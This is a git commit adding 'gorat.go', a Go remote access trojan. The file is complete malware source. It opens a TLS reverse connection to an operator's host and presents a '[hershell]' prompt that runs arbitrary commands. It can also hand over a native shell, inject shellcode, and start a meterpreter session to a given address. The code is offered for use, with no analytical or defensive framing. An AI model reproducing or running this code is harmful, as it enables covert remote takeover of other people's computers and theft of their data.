d930ff072da1506e3b1dfcc9e4484488e3447968
krishpranav <krisna.pranav@gmail.com>
2021-05-25 18:58:30 +0530

    [+] updated go rat [+]

---
+++ gorat.go
@@ -0,0 +1,123 @@
+package main
+
+import (
+	"bufio"
+	"bytes"
+	"crypto/sha256"
+	"crypto/tls"
+	"encoding/hex"
+	"net"
+	"os"
+	"os/exec"
+	"strings"
+
+	"github.com/krishpranav/gorat/meterpreter"
+	"github.com/krishpranav/gorat/shell"
+)
+
+const (
+	ERR_COULD_NOT_DECODE = 1 << iota
+	ERR_HOST_UNREACHABLE = iota
+	ERR_BAD_FINGERPRINT  = iota
+)
+
+var (
+	connectString string
+	fingerPrint   string
+)
+
+func InteractiveShell(conn net.Conn) {
+	var (
+		exit    bool           = false
+		prompt  string         = "[hershell]> "
+		scanner *bufio.Scanner = bufio.NewScanner(conn)
+	)
+
+	conn.Write([]byte(prompt))
+
+	for scanner.Scan() {
+		command := scanner.Text()
+		if len(command) > 1 {
+			argv := strings.Split(command, " ")
+			switch argv[0] {
+			case "meterpreter":
+				if len(argv) > 2 {
+					transport := argv[1]
+					address := argv[2]
+					ok, err := meterpreter.Meterpreter(transport, address)
+					if !ok {
+						conn.Write([]byte(err.Error() + "\n"))
+					}
+				} else {
+					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
+				}
+			case "inject":
+				if len(argv) > 1 {
+					shell.InjectShellcode(argv[1])
+				}
+			case "exit":
+				exit = true
+			case "run_shell":
+				conn.Write([]byte("Enjoy your native shell\n"))
+				RunShell(conn)
+			default:
+				shell.ExecuteCmd(command, conn)
+			}
+
+			if exit {
+				break
+			}
+
+		}
+		conn.Write([]byte(prompt))
+	}
+}
+
+func RunShell(conn net.Conn) {
+	var cmd *exec.Cmd = shell.GetShell()
+	cmd.Stdout = conn
+	cmd.Stderr = conn
+	cmd.Stdin = conn
+	cmd.Run()
+}
+
+func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
+	valid := false
+	connState := conn.ConnectionState()
+	for _, peerCert := range connState.PeerCertificates {
+		hash := sha256.Sum256(peerCert.Raw)
+		if bytes.Compare(hash[0:], fingerprint) == 0 {
+			valid = true
+		}
+	}
+	return valid, nil
+}
+
+func Reverse(connectString string, fingerprint []byte) {
+	var (
+		conn *tls.Conn
+		err  error
+	)
+	config := &tls.Config{InsecureSkipVerify: true}
+	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+		os.Exit(ERR_HOST_UNREACHABLE)
+	}
+
+	defer conn.Close()
+
+	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+		os.Exit(ERR_BAD_FINGERPRINT)
+	}
+	InteractiveShell(conn)
+}
+
+func main() {
+	if connectString != "" && fingerPrint != "" {
+		fprint := strings.Replace(fingerPrint, ":", "", -1)
+		bytesFingerprint, err := hex.DecodeString(fprint)
+		if err != nil {
+			os.Exit(ERR_COULD_NOT_DECODE)
+		}
+		Reverse(connectString, bytesFingerprint)
+	}
+}
